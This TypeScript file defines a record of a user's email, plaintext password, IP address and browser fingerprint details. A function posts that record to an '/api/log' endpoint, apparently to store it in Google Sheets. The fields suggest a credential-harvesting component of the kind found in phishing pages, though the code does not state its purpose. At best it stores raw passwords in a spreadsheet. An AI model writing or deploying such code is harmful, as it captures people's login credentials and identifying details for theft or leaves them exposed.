type logType =  {
    email: string,
    password: string,
    timestamp: string,
    userAgent: string,
    language: string,
    platform: string,
    vendor: string,
    screenResolution: string,
    ip: string,
  }

export async function logToGoogleSheets(data: logType) {
  try {
    const response = await fetch('/api/log', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data),
    });

    if (!response.ok) {
      throw new Error('Failed to log data');
    }

    console.log('Data logged to Google Sheets successfully');
  } catch (error) {
    console.error('Error logging to Google Sheets:', error);
  }
}
